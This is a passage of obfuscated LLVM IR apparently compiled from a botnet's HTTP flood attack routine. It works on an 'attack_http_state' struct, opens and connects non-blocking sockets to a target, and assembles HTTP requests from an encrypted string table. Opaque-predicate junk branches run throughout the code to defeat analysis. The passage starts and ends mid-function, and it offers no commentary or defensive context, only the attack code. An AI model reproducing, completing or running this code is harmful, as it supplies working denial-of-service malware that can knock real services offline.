  %593 = icmp eq i32 %592, 0
  %594 = icmp slt i32 %589, 10
  %595 = or i1 %593, %594
  br i1 %595, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %587
  %596 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %597 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %596, i32 0, i32 1
  store i8 0, i8* %597, align 4
  %598 = load i32, i32* @x.17
  %599 = load i32, i32* @y.18
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %606

; <label>:606:                                    ; preds = %originalBBpart282, %584
  %607 = load i32, i32* @x.17
  %608 = load i32, i32* @y.18
  %609 = sub i32 %607, 1
  %610 = mul i32 %607, %609
  %611 = urem i32 %610, 2
  %612 = icmp eq i32 %611, 0
  %613 = icmp slt i32 %608, 10
  %614 = or i1 %612, %613
  br i1 %614, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %606
  %615 = load i32, i32* @x.17
  %616 = load i32, i32* @y.18
  %617 = sub i32 %615, 1
  %618 = mul i32 %615, %617
  %619 = urem i32 %618, 2
  %620 = icmp eq i32 %619, 0
  %621 = icmp slt i32 %616, 10
  %622 = or i1 %620, %621
  br i1 %622, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %623

; <label>:623:                                    ; preds = %originalBBpart286, %569
  %624 = load i32, i32* @x.17
  %625 = load i32, i32* @y.18
  %626 = sub i32 %624, 1
  %627 = mul i32 %624, %626
  %628 = urem i32 %627, 2
  %629 = icmp eq i32 %628, 0
  %630 = icmp slt i32 %625, 10
  %631 = or i1 %629, %630
  br i1 %631, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %623
  %632 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %632, i32 0, i32 1
  %634 = load i8, i8* %633, align 4
  %635 = zext i8 %634 to i32
  %636 = icmp eq i32 %635, 0
  %637 = load i32, i32* @x.17
  %638 = load i32, i32* @y.18
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %636, label %645, label %757

; <label>:645:                                    ; preds = %originalBBpart290
  %646 = bitcast %struct.sockaddr_in* %40 to i8*
  call void @llvm.memset.p0i8.i64(i8* %646, i8 0, i64 16, i32 4, i1 false)
  %647 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %648 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %647, i32 0, i32 0
  %649 = load i32, i32* %648, align 4
  %650 = icmp ne i32 %649, -1
  br i1 %650, label %651, label %672

; <label>:651:                                    ; preds = %645
  %652 = load i32, i32* @x.17
  %653 = load i32, i32* @y.18
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %651
  %660 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %661 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %660, i32 0, i32 0
  %662 = load i32, i32* %661, align 4
  %663 = call i32 @close(i32 %662)
  %664 = load i32, i32* @x.17
  %665 = load i32, i32* @y.18
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br label %672

; <label>:672:                                    ; preds = %originalBBpart294, %645
  %673 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %674 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %675 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %674, i32 0, i32 0
  store i32 %673, i32* %675, align 4
  %676 = icmp eq i32 %673, -1
  br i1 %676, label %677, label %694

; <label>:677:                                    ; preds = %672
  %678 = load i32, i32* @x.17
  %679 = load i32, i32* @y.18
  %680 = sub i32 %678, 1
  %681 = mul i32 %678, %680
  %682 = urem i32 %681, 2
  %683 = icmp eq i32 %682, 0
  %684 = icmp slt i32 %679, 10
  %685 = or i1 %683, %684
  br i1 %685, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %677
  %686 = load i32, i32* @x.17
  %687 = load i32, i32* @y.18
  %688 = sub i32 %686, 1
  %689 = mul i32 %686, %688
  %690 = urem i32 %689, 2
  %691 = icmp eq i32 %690, 0
  %692 = icmp slt i32 %687, 10
  %693 = or i1 %691, %692
  br i1 %693, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %1504

; <label>:694:                                    ; preds = %672
  %695 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %696 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %695, i32 0, i32 0
  %697 = load i32, i32* %696, align 4
  %698 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %699 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %698, i32 0, i32 0
  %700 = load i32, i32* %699, align 4
  %701 = call i32 (i32, i32, ...) @fcntl(i32 %700, i32 3, i32 0)
  %702 = or i32 2048, %701
  %703 = call i32 (i32, i32, ...) @fcntl(i32 %697, i32 4, i32 %702)
  store i32 65535, i32* %18, align 4
  %704 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %705 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %704, i32 0, i32 0
  %706 = load i32, i32* %705, align 4
  %707 = bitcast i32* %18 to i8*
  %708 = call i32 @setsockopt(i32 %706, i32 0, i32 8, i8* %707, i32 4) #6
  %709 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %40, i32 0, i32 0
  store i16 2, i16* %709, align 4
  %710 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %711 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %710, i32 0, i32 4
  %712 = load i32, i32* %711, align 4
  %713 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %40, i32 0, i32 2
  %714 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %713, i32 0, i32 0
  store i32 %712, i32* %714, align 4
  %715 = load i16, i16* %27, align 2
  %716 = call zeroext i16 @htons(i16 zeroext %715) #7
  %717 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %40, i32 0, i32 1
  store i16 %716, i16* %717, align 2
  %718 = load i32, i32* %35, align 4
  %719 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %720 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %719, i32 0, i32 2
  store i32 %718, i32* %720, align 4
  %721 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %722 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %721, i32 0, i32 1
  store i8 2, i8* %722, align 4
  %723 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %724 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %723, i32 0, i32 0
  %725 = load i32, i32* %724, align 4
  %726 = bitcast %union.__CONST_SOCKADDR_ARG* %41 to %struct.sockaddr**
  %727 = bitcast %struct.sockaddr_in* %40 to %struct.sockaddr*
  store %struct.sockaddr* %727, %struct.sockaddr** %726, align 8
  %728 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %41, i32 0, i32 0
  %729 = load %struct.sockaddr*, %struct.sockaddr** %728, align 8
  %730 = call i32 @connect(i32 %725, %struct.sockaddr* %729, i32 16)
  %731 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %732 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %731, i32 0, i32 0
  %733 = load i32, i32* %732, align 4
  %734 = srem i32 %733, 64
  %735 = zext i32 %734 to i64
  %736 = shl i64 1, %735
  %737 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %738 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %739 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %738, i32 0, i32 0
  %740 = load i32, i32* %739, align 4
  %741 = sdiv i32 %740, 64
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds [16 x i64], [16 x i64]* %737, i64 0, i64 %742
  %744 = load i64, i64* %743, align 8
  %745 = or i64 %744, %736
  store i64 %745, i64* %743, align 8
  %746 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %747 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %746, i32 0, i32 0
  %748 = load i32, i32* %747, align 4
  %749 = load i32, i32* %31, align 4
  %750 = icmp sgt i32 %748, %749
  br i1 %750, label %751, label %756

; <label>:751:                                    ; preds = %694
  %752 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %753 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %752, i32 0, i32 0
  %754 = load i32, i32* %753, align 4
  %755 = add nsw i32 %754, 1
  store i32 %755, i32* %31, align 4
  br label %756

; <label>:756:                                    ; preds = %751, %694
  br label %1487

; <label>:757:                                    ; preds = %originalBBpart290
  %758 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %759 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %758, i32 0, i32 1
  %760 = load i8, i8* %759, align 4
  %761 = zext i8 %760 to i32
  %762 = icmp eq i32 %761, 2
  br i1 %762, label %763, label %838

; <label>:763:                                    ; preds = %757
  %764 = load i32, i32* %35, align 4
  %765 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %766 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %765, i32 0, i32 2
  %767 = load i32, i32* %766, align 4
  %768 = sub i32 %764, %767
  %769 = icmp ugt i32 %768, 30
  br i1 %769, label %770, label %795

; <label>:770:                                    ; preds = %763
  %771 = load i32, i32* @x.17
  %772 = load i32, i32* @y.18
  %773 = sub i32 %771, 1
  %774 = mul i32 %771, %773
  %775 = urem i32 %774, 2
  %776 = icmp eq i32 %775, 0
  %777 = icmp slt i32 %772, 10
  %778 = or i1 %776, %777
  br i1 %778, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %770
  %779 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %780 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %779, i32 0, i32 1
  store i8 0, i8* %780, align 4
  %781 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %782 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %781, i32 0, i32 0
  %783 = load i32, i32* %782, align 4
  %784 = call i32 @close(i32 %783)
  %785 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %786 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %785, i32 0, i32 0
  store i32 -1, i32* %786, align 4
  %787 = load i32, i32* @x.17
  %788 = load i32, i32* @y.18
  %789 = sub i32 %787, 1
  %790 = mul i32 %787, %789
  %791 = urem i32 %790, 2
  %792 = icmp eq i32 %791, 0
  %793 = icmp slt i32 %788, 10
  %794 = or i1 %792, %793
  br i1 %794, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %1504

; <label>:795:                                    ; preds = %763
  %796 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %797 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %796, i32 0, i32 0
  %798 = load i32, i32* %797, align 4
  %799 = srem i32 %798, 64
  %800 = zext i32 %799 to i64
  %801 = shl i64 1, %800
  %802 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %803 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %804 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %803, i32 0, i32 0
  %805 = load i32, i32* %804, align 4
  %806 = sdiv i32 %805, 64
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds [16 x i64], [16 x i64]* %802, i64 0, i64 %807
  %809 = load i64, i64* %808, align 8
  %810 = or i64 %809, %801
  store i64 %810, i64* %808, align 8
  %811 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %812 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %811, i32 0, i32 0
  %813 = load i32, i32* %812, align 4
  %814 = load i32, i32* %31, align 4
  %815 = icmp sgt i32 %813, %814
  br i1 %815, label %816, label %837

; <label>:816:                                    ; preds = %795
  %817 = load i32, i32* @x.17
  %818 = load i32, i32* @y.18
  %819 = sub i32 %817, 1
  %820 = mul i32 %817, %819
  %821 = urem i32 %820, 2
  %822 = icmp eq i32 %821, 0
  %823 = icmp slt i32 %818, 10
  %824 = or i1 %822, %823
  br i1 %824, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %816
  %825 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %826 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %825, i32 0, i32 0
  %827 = load i32, i32* %826, align 4
  %828 = add nsw i32 %827, 1
  store i32 %828, i32* %31, align 4
  %829 = load i32, i32* @x.17
  %830 = load i32, i32* @y.18
  %831 = sub i32 %829, 1
  %832 = mul i32 %829, %831
  %833 = urem i32 %832, 2
  %834 = icmp eq i32 %833, 0
  %835 = icmp slt i32 %830, 10
  %836 = or i1 %834, %835
  br i1 %836, label %originalBBpart2114, label %originalBB104alteredBB

originalBBpart2114:                               ; preds = %originalBB104
  br label %837

; <label>:837:                                    ; preds = %originalBBpart2114, %795
  br label %1486

; <label>:838:                                    ; preds = %757
  %839 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %840 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %839, i32 0, i32 1
  %841 = load i8, i8* %840, align 4
  %842 = zext i8 %841 to i32
  %843 = icmp eq i32 %842, 4
  br i1 %843, label %844, label %1230

; <label>:844:                                    ; preds = %838
  %845 = load i32, i32* @x.17
  %846 = load i32, i32* @y.18
  %847 = sub i32 %845, 1
  %848 = mul i32 %845, %847
  %849 = urem i32 %848, 2
  %850 = icmp eq i32 %849, 0
  %851 = icmp slt i32 %846, 10
  %852 = or i1 %850, %851
  br i1 %852, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %844
  %853 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %854 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %853, i32 0, i32 14
  store i32 -1, i32* %854, align 4
  %855 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %856 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %855, i32 0, i32 11
  store i32 0, i32* %856, align 4
  %857 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %858 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %857, i32 0, i32 18
  %859 = getelementptr inbounds [1024 x i8], [1024 x i8]* %858, i32 0, i32 0
  call void @util_zero(i8* %859, i32 1024)
  %860 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %861 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %860, i32 0, i32 17
  store i32 0, i32* %861, align 4
  %862 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  call void @util_zero(i8* %862, i32 10240)
  %863 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %864 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %865 = call i32 @util_strlen(i8* %864)
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds i8, i8* %863, i64 %866
  %868 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %869 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %868, i32 0, i32 9
  %870 = getelementptr inbounds [9 x i8], [9 x i8]* %869, i32 0, i32 0
  %871 = call i32 @util_strcpy(i8* %867, i8* %870)
  %872 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %873 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %874 = call i32 @util_strlen(i8* %873)
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds i8, i8* %872, i64 %875
  %877 = call i32 @util_strcpy(i8* %876, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %878 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %879 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %880 = call i32 @util_strlen(i8* %879)
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds i8, i8* %878, i64 %881
  %883 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %884 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %883, i32 0, i32 6
  %885 = getelementptr inbounds [257 x i8], [257 x i8]* %884, i32 0, i32 0
  %886 = call i32 @util_strcpy(i8* %882, i8* %885)
  %887 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %888 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %889 = call i32 @util_strlen(i8* %888)
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds i8, i8* %887, i64 %890
  %892 = call i32 @util_strcpy(i8* %891, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %893 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %894 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %895 = call i32 @util_strlen(i8* %894)
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds i8, i8* %893, i64 %896
  %898 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %899 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %898, i32 0, i32 5
  %900 = getelementptr inbounds [512 x i8], [512 x i8]* %899, i32 0, i32 0
  %901 = call i32 @util_strcpy(i8* %897, i8* %900)
  %902 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %903 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %904 = call i32 @util_strlen(i8* %903)
  %905 = sext i32 %904 to i64
  %906 = getelementptr inbounds i8, i8* %902, i64 %905
  %907 = call i32 @util_strcpy(i8* %906, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %908 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %909 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %910 = call i32 @util_strlen(i8* %909)
  %911 = sext i32 %910 to i64
  %912 = getelementptr inbounds i8, i8* %908, i64 %911
  %913 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %914 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %913, i32 0, i32 7
  %915 = getelementptr inbounds [129 x i8], [129 x i8]* %914, i32 0, i32 0
  %916 = call i32 @util_strcpy(i8* %912, i8* %915)
  %917 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %918 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %919 = call i32 @util_strlen(i8* %918)
  %920 = sext i32 %919 to i64
  %921 = getelementptr inbounds i8, i8* %917, i64 %920
  %922 = call i32 @util_strcpy(i8* %921, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 39)
  %923 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %924 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %925 = call i32 @util_strlen(i8* %924)
  %926 = sext i32 %925 to i64
  %927 = getelementptr inbounds i8, i8* %923, i64 %926
  %928 = call i8* @table_retrieve_val(i32 39, i32* null)
  %929 = call i32 @util_strcpy(i8* %927, i8* %928)
  call void @table_lock_val(i8 zeroext 39)
  %930 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %931 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %932 = call i32 @util_strlen(i8* %931)
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds i8, i8* %930, i64 %933
  %935 = call i32 @util_strcpy(i8* %934, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 40)
  %936 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %937 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %938 = call i32 @util_strlen(i8* %937)
  %939 = sext i32 %938 to i64
  %940 = getelementptr inbounds i8, i8* %936, i64 %939
  %941 = call i8* @table_retrieve_val(i32 40, i32* null)
  %942 = call i32 @util_strcpy(i8* %940, i8* %941)
  call void @table_lock_val(i8 zeroext 40)
  %943 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %944 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %945 = call i32 @util_strlen(i8* %944)
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds i8, i8* %943, i64 %946
  %948 = call i32 @util_strcpy(i8* %947, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 41)
  %949 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %950 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %951 = call i32 @util_strlen(i8* %950)
  %952 = sext i32 %951 to i64
  %953 = getelementptr inbounds i8, i8* %949, i64 %952
  %954 = call i8* @table_retrieve_val(i32 41, i32* null)
  %955 = call i32 @util_strcpy(i8* %953, i8* %954)
  call void @table_lock_val(i8 zeroext 41)
  %956 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %957 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %958 = call i32 @util_strlen(i8* %957)
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds i8, i8* %956, i64 %959
  %961 = call i32 @util_strcpy(i8* %960, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %962 = load i8*, i8** %22, align 8
  %963 = icmp ne i8* %962, null
  %964 = load i32, i32* @x.17
  %965 = load i32, i32* @y.18
  %966 = sub i32 %964, 1
  %967 = mul i32 %964, %966
  %968 = urem i32 %967, 2
  %969 = icmp eq i32 %968, 0
  %970 = icmp slt i32 %965, 10
  %971 = or i1 %969, %970
  br i1 %971, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br i1 %963, label %972, label %1013

; <label>:972:                                    ; preds = %originalBBpart2118
  call void @table_unlock_val(i8 zeroext 42)
  %973 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %974 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %975 = call i32 @util_strlen(i8* %974)
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds i8, i8* %973, i64 %976
  %978 = call i8* @table_retrieve_val(i32 42, i32* null)
  %979 = call i32 @util_strcpy(i8* %977, i8* %978)
  call void @table_lock_val(i8 zeroext 42)
  %980 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %981 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %982 = call i32 @util_strlen(i8* %981)
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds i8, i8* %980, i64 %983
  %985 = call i32 @util_strcpy(i8* %984, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %986 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %987 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %988 = call i32 @util_strlen(i8* %987)
  %989 = sext i32 %988 to i64
  %990 = getelementptr inbounds i8, i8* %986, i64 %989
  %991 = call i8* @table_retrieve_val(i32 47, i32* null)
  %992 = call i32 @util_strcpy(i8* %990, i8* %991)
  %993 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %994 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %995 = call i32 @util_strlen(i8* %994)
  %996 = sext i32 %995 to i64
  %997 = getelementptr inbounds i8, i8* %993, i64 %996
  %998 = call i32 @util_strcpy(i8* %997, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %999 = load i8*, i8** %22, align 8
  %1000 = call i32 @util_strlen(i8* %999)
  %1001 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1002 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1003 = call i32 @util_strlen(i8* %1002)
  %1004 = sext i32 %1003 to i64
  %1005 = getelementptr inbounds i8, i8* %1001, i64 %1004
  %1006 = call i8* @util_itoa(i32 %1000, i32 10, i8* %1005)
  %1007 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1008 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1009 = call i32 @util_strlen(i8* %1008)
  %1010 = sext i32 %1009 to i64
  %1011 = getelementptr inbounds i8, i8* %1007, i64 %1010
  %1012 = call i32 @util_strcpy(i8* %1011, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %1013

; <label>:1013:                                   ; preds = %972, %originalBBpart2118
  %1014 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1015 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1014, i32 0, i32 15
  %1016 = load i32, i32* %1015, align 4
  %1017 = icmp sgt i32 %1016, 0
  br i1 %1017, label %1018, label %1108

; <label>:1018:                                   ; preds = %1013
  %1019 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1020 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1021 = call i32 @util_strlen(i8* %1020)
  %1022 = sext i32 %1021 to i64
  %1023 = getelementptr inbounds i8, i8* %1019, i64 %1022
  %1024 = call i32 @util_strcpy(i8* %1023, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %18, align 4
  br label %1025

; <label>:1025:                                   ; preds = %originalBBpart2135, %1018
  %1026 = load i32, i32* @x.17
  %1027 = load i32, i32* @y.18
  %1028 = sub i32 %1026, 1
  %1029 = mul i32 %1026, %1028
  %1030 = urem i32 %1029, 2
  %1031 = icmp eq i32 %1030, 0
  %1032 = icmp slt i32 %1027, 10
  %1033 = or i1 %1031, %1032
  br i1 %1033, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %1025
  %1034 = load i32, i32* %18, align 4
  %1035 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1036 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1035, i32 0, i32 15
  %1037 = load i32, i32* %1036, align 4
  %1038 = icmp slt i32 %1034, %1037
  %1039 = load i32, i32* @x.17
  %1040 = load i32, i32* @y.18
  %1041 = sub i32 %1039, 1
  %1042 = mul i32 %1039, %1041
  %1043 = urem i32 %1042, 2
  %1044 = icmp eq i32 %1043, 0
  %1045 = icmp slt i32 %1040, 10
  %1046 = or i1 %1044, %1045
  br i1 %1046, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br i1 %1038, label %1047, label %1085

; <label>:1047:                                   ; preds = %originalBBpart2122
  %1048 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1049 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %1050 = call i32 @util_strlen(i8* %1049)
  %1051 = sext i32 %1050 to i64
  %1052 = getelementptr inbounds i8, i8* %1048, i64 %1051
  %1053 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %1054 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1053, i32 0, i32 16
  %1055 = load i32, i32* %18, align 4
  %1056 = sext i32 %1055 to i64
  %1057 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1054, i64 0, i64 %1056
